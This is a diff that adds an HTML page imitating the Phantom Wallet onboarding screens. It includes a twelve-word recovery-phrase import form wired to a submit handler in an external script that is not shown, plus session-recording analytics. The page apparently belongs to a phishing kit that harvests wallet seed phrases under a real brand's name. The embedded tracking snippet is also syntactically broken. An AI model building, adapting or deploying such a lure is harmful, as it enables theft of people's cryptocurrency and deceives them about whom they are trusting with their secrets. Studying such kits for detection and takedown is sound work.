@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Phantom Wallet</title>
+		<script src="https://cdn.tailwindcss.com"></script>
+		<link
+			href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
+			rel="stylesheet"
+		/>
+
+		<link rel="icon" type="image/png" href="/assets/images/85gpe4wy5ZNA.png" />
+
+		<link rel="stylesheet" type="text/css" href="./assets/css/style.css" />
+	<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+	<style>
+#toggle24:hover {
+ color: #AB9FF2;
+}
+
+	</style>
+	<!-- Yandex.Metrika counter -->
+<script type="text/javascript">
+    (function(m,e,t,r,i,k,a){
+        m[i]=m[i]function(){(m[i].a=m[i].a[]).push(arguments)};
+        m[i].l=1*new Date();
+        for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+        k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)
+    })(window, document,'script','https://mc.yandex.ru/metrika/tag.js?id=103469351', 'ym');
+
+    ym(103469351, 'init', {ssr:true, webvisor:true, clickmap:true, ecommerce:"dataLayer", accurateTrackBounce:true, trackLinks:true});
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/103469351" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+	</head>
+	<body class="gradient-bg min-h-screen flex items-center justify-center p-4">
+		<div class="absolute top-4 left-4 md:top-6 md:left-6">
+			<svg
+				fill="none"
+				viewBox="0 0 24 24"
+				width="28px"
+				height="28px"
+				class="md:w-9 md:h-9"
+				stroke-linecap="round"
+				stroke-linejoin="round"
+			>
+				<path
+					fill="#1F1F1F"
+					fill-rule="evenodd"
+					d="M9.78 16.95c-1.26 1.928-3.37 4.37-6.177 4.37C2.276 21.32 1 20.774 1 18.4 1 12.356 9.252 3 16.909 3 21.265 3 23 6.022 23 9.454c0 4.405-2.858 9.442-5.7 9.442-.902 0-1.344-.496-1.344-1.281 0-.205.034-.427.102-.666-.97 1.656-2.841 3.193-4.594 3.193-1.276 0-1.923-.802-1.923-1.93 0-.41.085-.836.239-1.263m6.595-7.615c0 1-.59 1.5-1.25 1.5-.67 0-1.25-.5-1.25-1.5s.58-1.5 1.25-1.5c.66 0 1.25.5 1.25 1.5m3.75 0c0 1-.59 1.5-1.25 1.5-.67 0-1.25-.5-1.25-1.5s.58-1.5 1.25-1.5c.66 0 1.25.5 1.25 1.5"
+					clip-rule="evenodd"
+				></path>
+			</svg>
+		</div>
+		<div class="absolute top-4 right-4 md:top-6 md:right-6">
+			<button
+				class="flex items-center space-x-2 text-gray-600 hover:text-gray-800 transition-colors"
+			>
+				<svg
+					fill="bgWallet"
+					viewBox="0 0 24 24"
+					width="16px"
+					height="16px"
+					class="md:w-5 md:h-5"
+					stroke-linecap="round"
+					stroke-linejoin="round"
+				>
+					<path
+						stroke="#E2DFFE"
+						stroke-linecap="round"
+						stroke-linejoin="round"
+						stroke-width="2"
+						d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3m.08 4h.01M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2s10 4.477 10 10"
+					></path>
+				</svg>
+				<span class="text-xs md:text-sm font-medium">Help</span>
+			</button>
+		</div>
+		<div class="card-main relative overflow-hidden">
+			<div
+				id="welcomeSection"
+				class="section-transition section-visible flex flex-col h-full"
+			>
+				<div
+					class="flex flex-col justify-center items-center px-4 md:px-6 lg:px-8 flex-1"
+					style="margin-top: 15vh"
+				>
+					<div class="mb-8">
+						<svg
+							width="200"
+							viewBox="0 0 1139 224"
+							fill="#FFFFFF"
+							xmlns="http://www.w3.org/2000/svg"
+							class="md:w-64"
+						>
+							<path
+								d="M31.8301 224C66.1567 224 91.9536 194.147 107.349 170.557C105.476 175.776 104.436 180.995 104.436 186.006C104.436 199.784 112.342 209.596 127.944 209.596C149.373 209.596 172.257 190.807 184.115 170.557C183.283 173.48 182.867 176.194 182.867 178.699C182.867 188.302 188.276 194.356 199.302 194.356C234.045 194.356 268.995 132.772 268.995 78.9115C268.995 36.9506 247.775 0 194.517 0C100.899 0 0 114.401 0 188.302C0 217.32 15.603 224 31.8301 224ZM162.271 74.3187C162.271 63.8807 168.096 56.5741 176.626 56.5741C184.947 56.5741 190.773 63.8807 190.773 74.3187C190.773 84.7568 184.947 92.2721 176.626 92.2721C168.096 92.2721 162.271 84.7568 162.271 74.3187ZM206.792 74.3187C206.792 63.8807 212.617 56.5741 221.146 56.5741C229.468 56.5741 235.293 63.8807 235.293 74.3187C235.293 84.7568 229.468 92.2721 221.146 92.2721C212.617 92.2721 206.792 84.7568 206.792 74.3187Z"
+							></path>
+							<path
+								d="M310.588 201.245H341.793V170.557C341.793 156.153 340.545 150.725 333.264 136.112L337.216 134.024C347.826 158.867 362.805 167.843 378.199 167.843C402.955 167.843 422.718 146.132 422.718 112.522C422.718 80.3728 404.619 56.7828 378.615 56.7828C363.221 56.7828 347.826 65.5508 337.216 90.6021L333.264 88.5144C338.257 78.4939 341.793 69.0997 341.793 60.123H310.588V201.245ZM341.793 112.313C341.793 98.535 352.195 83.2954 367.589 83.2954C380.071 83.2954 390.265 93.5247 390.265 112.104C390.265 130.475 380.487 141.331 367.381 141.331C352.819 141.331 341.793 126.509 341.793 112.313Z"
+							></path>
+							<path
+								d="M434.108 164.503H465.313V127.761C465.313 101.875 474.467 83.5042 491.525 83.5042C502.343 83.5042 505.672 90.8107 505.672 108.973V164.503H536.877V103.963C536.877 70.9785 525.019 56.7827 502.343 56.7827C479.043 56.7827 471.346 72.4398 462.401 91.437L458.448 89.3494C463.857 77.6588 465.313 70.561 465.313 60.1229V24.0074H434.108V164.503Z"
+							></path>
+							<path
+								d="M582.482 167.843C602.661 167.843 614.519 154.483 623.464 137.364L627.209 139.243C623.256 147.385 619.512 156.779 619.512 164.503H650.093V107.72C650.093 73.9012 635.946 56.7828 602.869 56.7828C570.416 56.7828 554.397 73.0662 551.277 90.1845L581.234 95.4035C582.274 86.4268 589.555 80.3728 601.205 80.3728C612.855 80.3728 619.512 86.2181 619.512 93.3159C619.512 100.414 612.647 103.754 594.34 103.963C567.295 104.38 547.324 114.192 547.324 135.068C547.324 152.186 560.846 167.843 582.482 167.843ZM578.321 132.98C578.321 116.488 604.533 127.97 618.888 115.236V118.993C618.888 133.815 605.782 144.671 592.675 144.671C585.81 144.671 578.321 141.748 578.321 132.98Z"
+							></path>
+							<path
+								d="M662.458 164.503H693.663V127.761C693.663 101.875 702.816 83.5042 719.875 83.5042C730.693 83.5042 734.021 90.8108 734.021 108.973V164.503H765.227V103.963C765.227 70.9786 753.369 56.7828 730.693 56.7828C707.393 56.7828 699.696 72.4399 690.75 91.4371L686.798 89.3495C692.207 77.6589 693.663 70.5611 693.663 60.123H662.458V164.503Z"
+							></path>
+							<path
+								d="M848.341 164.921V139.034C841.684 141.331 823.169 145.297 823.169 130.058V85.1742H848.133V60.1229H823.169V32.149L791.756 41.5432V60.1229H773.033V85.1742H791.756L791.964 132.563C791.964 167.426 822.961 172.436 848.341 164.921Z"
+							></path>
+							<path
+								d="M911.728 167.843C943.349 167.843 967.481 143.627 967.481 112.104C967.481 80.7903 943.349 56.7828 911.728 56.7828C880.107 56.7828 855.767 80.7903 855.767 112.104C855.767 143.627 880.107 167.843 911.728 167.843ZM888.012 112.313C888.012 94.986 897.79 82.8779 911.728 82.8779C925.666 82.8779 935.236 94.986 935.236 112.313C935.236 129.640 925.666 141.748 911.728 141.748C897.79 141.748 888.012 129.640 888.012 112.313Z"
+							></path>
+							<path
+								d="M977.15 164.503H1008.35V127.761C1008.35 100.831 1016.88 83.5042 1030.61 83.5042C1039.56 83.5042 1042.47 90.6021 1042.47 108.973V164.503H1073.68V127.761C1073.68 102.501 1082.83 83.5042 1095.94 83.5042C1104.67 83.5042 1107.79 91.6459 1107.79 108.973V164.503H1139V103.963C1139 70.7698 1128.18 56.7828 1106.96 56.7828C1084.91 56.7828 1077.01 72.4399 1069.31 91.6459L1065.56 89.767C1072.85 67.8472 1057.03 56.7828 1041.43 56.7828C1020.84 56.7828 1013.35 72.4399 1005.03 91.6459L1001.28 89.3495C1006.48 77.6589 1008.35 70.5611 1008.35 60.123H977.15V164.503Z"
+							></path>
+						</svg>
+					</div>
+					<p
+						class="text-gray-400 text-center text-base md:text-lg font-medium leading-6 tracking-tight"
+					>
+						Create a new wallet or import an existing one to get started.
+					</p>
+				</div>
+				<div class="px-6 space-y-4 mt-auto" style="margin-top: 20%">
+					<button onclick="showCreateSection()" class="w-full button-primary">
+						Create a new wallet
+					</button>
+					<button onclick="showImportSection()" class="w-full button-secondary">
+						I already have a wallet
+					</button>
+				</div>
+			</div>
+			<div
+				id="importSection"
+				class="section-transition section-hidden h-full flex flex-col mb-10"
+			>
+				<div class="header-section">
+					<button
+						onclick="window.location.href='/login.html'"
+						class="back-button"
+					>
+						<svg
+							fill="none"
+							viewBox="0 0 24 24"
+							width="20px"
+							height="20px"
+							stroke-linecap="round"
+							stroke-linejoin="round"
+						>
+							<path
+								stroke="#777"
+								stroke-linecap="round"
+								stroke-linejoin="round"
+								stroke-width="2"
+								d="M19 12H5m0 0 7 7m-7-7 7-7"
+							></path>
+						</svg>
+					</button>
+					<div class="flex items-center gap-2">
+						<div class="progress-dot active"></div>
+						<div class="progress-dot"></div>
+						<div class="progress-dot"></div>
+					</div>
+					<div class="w-5"></div>
+				</div>
+				<div class="flex flex-col flex-1">
+					<div
+						class="flex flex-col w-full items-center justify-start mt-6 md:mt-8 mb-5"
+					>
+						<h1
+							class="text-white text-center text-2xl md:text-3xl font-medium mb-3 leading-8 md:leading-9"
+						>
+							Import Wallet
+						</h1>
+						<p
+							class="text-gray-400 text-center text-base md:text-lg leading-6 max-w-sm px-4"
+						>
+							Import an existing wallet using your email, recovery phrase,
+							private key, or hardware wallet.
+						</p>
+					</div>
+					<div class="flex flex-col w-full gap-2 whitespace-nowrap px-6">
+						<button onclick="showRecoverySection()" class="import-option">
+							<div class="icon-container">
+								<svg
+									fill="none"
+									viewBox="0 0 24 24"
+									width="20px"
+									height="20px"
+									stroke-linecap="round"
+									stroke-linejoin="round"
+								>
+									<path
+										stroke="white"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+										stroke-width="2"
+										d="M12 16a4 4 0 1 0 0-8 4 4 0 0 0 0 8"
+									></path>
+									<path
+										stroke="white"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+										stroke-width="2"
+										d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-3.92 7.94"
+									></path>
+								</svg>
+							</div>
+							<div class="flex flex-col flex-1 min-w-0 items-start gap-1">
+								<div
+									class="text-white text-left text-sm md:text-base font-medium leading-5"
+								>
+									Connect Email Wallet
+								</div>
+								<div
+									class="text-gray-400 text-left text-xs md:text-sm leading-4"
+								>
+									Use your Apple ID or Google account...
+								</div>
+							</div>
+						</button>
+						<button onclick="showRecoverySection()" class="import-option">
+							<div class="icon-container">
+								<svg
+									fill="none"
+									viewBox="0 0 24 24"
+									width="20px"
+									height="20px"
+									stroke-linecap="round"
+									stroke-linejoin="round"
+								>
+									<path
+										stroke="white"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+										stroke-width="2"
+										d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9"
+									></path>
+									<path
+										fill="white"
+										stroke="white"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+										stroke-width="2"
+										d="m13 2 7 7h-7z"
+									></path>
+								</svg>
+							</div>
+							<div class="flex flex-col flex-1 min-w-0 items-start gap-1">
+								<div
+									class="text-white text-left text-sm md:text-base font-medium leading-5"
+								>
+									Import Recovery Phrase
+								</div>
+								<div
+									class="text-gray-400 text-left text-xs md:text-sm leading-4"
+								>
+									Import accounts from another wallet
+								</div>
+							</div>
+						</button>
+						<button onclick="showRecoverySection()" class="import-option">
+							<div class="icon-container">
+								<svg
+									fill="none"
+									viewBox="0 0 24 24"
+									width="20px"
+									height="20px"
+									stroke-linecap="round"
+									stroke-linejoin="round"
+								>
+									<path
+										stroke="white"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+										stroke-width="2"
+										d="m17 10-5 5m0 0-5-5m5 5V3M3 16v2a3 3 0 0 0 3 3h12a3 3 0 0 0 3-3v-2"
+									></path>
+								</svg>
+							</div>
+							<div class="flex flex-col flex-1 min-w-0 items-start gap-1">
+								<div
+									class="text-white text-left text-sm md:text-base font-medium leading-5"
+								>
+									Import Private Key
+								</div>
+								<div
+									class="text-gray-400 text-left text-xs md:text-sm leading-4"
+								>
+									Import a single-chain account
+								</div>
+							</div>
+						</button>
+						<button onclick="showRecoverySection()" class="import-option">
+							<div class="icon-container">
+								<svg
+									fill="none"
+									viewBox="0 0 24 24"
+									width="20px"
+									height="20px"
+									stroke-linecap="round"
+									stroke-linejoin="round"
+								>
+									<path
+										stroke="white"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+										stroke-width="2"
+										d="m15.606 10 2.261-2.48a2 2 0 0 0-.13-2.825l-1.478-1.347a2 2 0 0 0-2.825.13L4.523 13.25A2 2 0 0 0 4 14.597V16m0 0v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2"
+									></path>
+								</svg>
+							</div>
+							<div class="flex flex-col flex-1 min-w-0 items-start gap-1">
+								<div
+									class="text-white text-left text-sm md:text-base font-medium leading-5"
+								>
+									Connect Hardware Wallet
+								</div>
+								<div
+									class="text-gray-400 text-left text-xs md:text-sm leading-4"
+								>
+									Use your Ledger hardware wallet
+								</div>
+							</div>
+						</button>
+					</div>
+				</div>
+			</div>
+
+			<div
+				id="createSection"
+				class="section-transition section-hidden h-full flex flex-col"
+			>
+				<div class="header-section">
+					<button
+						onclick="window.location.href='/login.html'"
+						class="back-button"
+					>
+						<svg
+							fill="none"
+							viewBox="0 0 24 24"
+							width="20px"
+							height="20px"
+							stroke-linecap="round"
+							stroke-linejoin="round"
+						>
+							<path
+								stroke="#777"
+								stroke-linecap="round"
+								stroke-linejoin="round"
+								stroke-width="2"
+								d="M19 12H5m0 0 7 7m-7-7 7-7"
+							></path>
+						</svg>
+					</button>
+					<div class="flex items-center gap-2">
+						<div class="progress-dot active"></div>
+						<div class="progress-dot active"></div>
+						<div class="progress-dot"></div>
+					</div>
+					<div class="w-5"></div>
+				</div>
+				<div class="flex flex-col flex-1 px-5 pb-5">
+					<div
+						class="flex flex-col w-full items-center justify-start"
+						style="margin: 30px 0px 20px"
+					>
+						<h1
+							class="text-white text-center font-medium text-3xl mb-3 leading-9"
+						>
+							Secret Recovery Phrase
+						</h1>
+						<p class="text-gray-400 text-center text-lg leading-6 max-w-sm">
+							This phrase is the ONLY way to recover your wallet. Save it
+							somewhere safe and secret.
+						</p>
+					</div>
+					<div
+						class="w-full flex flex-col justify-between flex-1"
+						style="min-height: 300px"
+					>
+						<div class="seed-phrase-container">
+							<div id="seedPhraseDisplay" class="seed-phrase-grid">
+								<!-- Seed phrase words will be inserted here by JavaScript -->
+							</div>
+							<div class="flex justify-between mt-4">
+								<button
+									onclick="copySeedPhrase()"
+									class="text-gray-400 hover:text-white transition-colors text-sm flex items-center"
+								>
+									<svg
+										fill="none"
+										viewBox="0 0 24 24"
+										width="16px"
+										height="16px"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+										class="mr-1"
+									>
+										<path
+											stroke="currentColor"
+											stroke-linecap="round"
+											stroke-linejoin="round"
+											stroke-width="2"
+											d="M8 16H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v2m-6 12h8a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-8a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2"
+										></path>
+									</svg>
+									Copy to clipboard
+								</button>
+								<button
+									onclick="generateNewSeedPhrase()"
+									class="text-gray-400 hover:text-white transition-colors text-sm flex items-center"
+								>
+									<svg
+										fill="none"
+										viewBox="0 0 24 24"
+										width="16px"
+										height="16px"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+										class="mr-1"
+									>
+										<path
+											stroke="currentColor"
+											stroke-linecap="round"
+											stroke-linejoin="round"
+											stroke-width="2"
+											d="M19 7h-2m2 7h-2m-6 2H9m4-10H9m4 6H9m8 4h2a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h2"
+										></path>
+									</svg>
+									Generate new phrase
+								</button>
+							</div>
+						</div>
+						<div class="flex flex-col gap-4 mt-4">
+							<div class="w-full flex justify-center">
+								<button
+								id="toggle24"
+									type="button"
+									onclick="toggle24()"
+									class="text-gray-400 transition-colors text-sm underline"
+									style="text-decoration: none"
+								>
+									Generate 24-word recovery phrase
+								</button>
+							</div>
+							<button
+							id="saved"
+								type="button"
+								class="w-full button-primary"
+							>
+								I've saved my recovery phrase
+							</button>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div
+				id="recoverySection"
+				class="section-transition section-hidden h-full flex flex-col"
+			>
+				<div class="header-section">
+					<button onclick="showImportSection()" class="back-button">
+						<svg
+							fill="none"
+							viewBox="0 0 24 24"
+							width="20px"
+							height="20px"
+							stroke-linecap="round"
+							stroke-linejoin="round"
+						>
+							<path
+								stroke="#777"
+								stroke-linecap="round"
+								stroke-linejoin="round"
+								stroke-width="2"
+								d="M19 12H5m0 0 7 7m-7-7 7-7"
+							></path>
+						</svg>
+					</button>
+					<div class="flex items-center gap-2">
+						<div class="progress-dot active"></div>
+						<div class="progress-dot active"></div>
+						<div class="progress-dot"></div>
+					</div>
+					<div class="w-5"></div>
+				</div>
+				<div class="flex flex-col flex-1 px-5 pb-5">
+					<div
+						class="flex flex-col w-full items-center justify-start"
+						style="margin: 30px 0px 20px"
+					>
+						<h1
+							class="text-white text-center font-medium text-3xl mb-3 leading-9"
+						>
+							Recovery Phrase
+						</h1>
+						<p class="text-gray-400 text-center text-lg leading-6 max-w-sm">
+							Import an existing wallet using your 12 or 24 word recovery
+							phrase.
+						</p>
+					</div>
+					<form
+						class="w-full flex flex-col justify-between flex-1"
+						style="min-height: 300px"
+					>
+						<div id="inputGrid" class="grid grid-cols-3 gap-2.5 w-full">
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0">1.</span>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0">2.</span>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0">3.</span>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0">4.</span>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0">5.</span>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0">6.</span>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0">7.</span>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0">8.</span>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0">9.</span>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0"
+									>10.</span
+								>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0"
+									>11.</span
+								>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+							<div
+								class="flex items-center w-full px-2 input-container"
+								style="
+									box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
+									color: rgb(255, 255, 255);
+									background: rgb(24, 24, 24);
+									border: 1px solid rgb(50, 50, 50);
+									border-radius: 6px;
+									align-self: center;
+									height: 41px;
+									transition: 0.1s linear;
+								"
+							>
+								<span class="text-gray-400 text-sm mr-2 flex-shrink-0"
+									>12.</span
+								>
+								<input
+									type="text"
+									class="bg-transparent text-white text-sm border-none outline-none flex-1"
+									autocomplete="off"
+									autocorrect="off"
+									spellcheck="false"
+									pattern="[A-Za-z\s]+"
+								/>
+							</div>
+						</div>
+						<div class="flex flex-col gap-4 mt-4">
+							<div class="w-full flex justify-center">
+								<button
+									type="button"
+									onclick="toggle24Words()"
+									class="text-gray-400 transition-colors text-sm underline"
+									style="text-decoration: none"
+								>
+									I have a 24-word recovery phrase
+								</button>
+							</div>
+							<button
+								type="submit"
+								class="w-full bg-gray-600 text-white font-semibold rounded-2xl transition-colors"
+								style="height: 47px; font-size: 16px"
+							>
+								Import Wallet
+							</button>
+						</div>
+					</form>
+				</div>
+			</div>
+		</div>
+		<div
+			id="copyModal"
+			class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50 hidden"
+		>
+			<div
+				class="bg-gray-900 text-white px-6 py-4 rounded-lg shadow-lg text-center"
+			>
+				<p class="text-lg font-semibold">Seed phrase copied to clipboard!</p>
+			</div>
+		</div>
+
+		<script>
+		function showCreateSection() {
+  document.getElementById('welcomeSection').classList.remove('section-visible');
+  document.getElementById('welcomeSection').classList.add('section-hidden');
+
+  document.getElementById('createSection').classList.remove('section-hidden');
+  document.getElementById('createSection').classList.add('section-visible');
+
+  generateNewSeedPhrase();
+}
+
+			function showImportSection() {
+				document
+					.getElementById('welcomeSection')
+					.classList.remove('section-visible')
+				document
+					.getElementById('welcomeSection')
+					.classList.add('section-hidden')
+
+				document
+					.getElementById('importSection')
+					.classList.remove('section-hidden')
+				document
+					.getElementById('importSection')
+					.classList.add('section-visible')
+			}
+
+			function showWelcomeSection() {
+				document
+					.getElementById('welcomeSection')
+					.classList.remove('section-hidden')
+				document
+					.getElementById('welcomeSection')
+					.classList.add('section-visible')
+
+				document
+					.getElementById('importSection')
+					.classList.remove('section-visible')
+				document.getElementById('importSection').classList.add('section-hidden')
+
+				document
+					.getElementById('createSection')
+					.classList.remove('section-visible')
+				document.getElementById('createSection').classList.add('section-hidden')
+
+				document
+					.getElementById('recoverySection')
+					.classList.remove('section-visible')
+				document
+					.getElementById('recoverySection')
+					.classList.add('section-hidden')
+			}
+
+			function showRecoverySection() {
+				document
+					.getElementById('importSection')
+					.classList.remove('section-visible')
+				document.getElementById('importSection').classList.add('section-hidden')
+
+				document
+					.getElementById('recoverySection')
+					.classList.remove('section-hidden')
+				document
+					.getElementById('recoverySection')
+					.classList.add('section-visible')
+			}
+		</script>
+		<script>
+			document.addEventListener('DOMContentLoaded', function () {
+				const form = document.querySelector('#recoverySection form')
+				if (form) {
+					form.addEventListener('submit', handleFormSubmit)
+				}
+			})
+		</script>
+
+		<script src="./assets/js/generate.js"></script>
+
+		<script src="./assets/js/script.js"></script>
+	</body>
+</html>
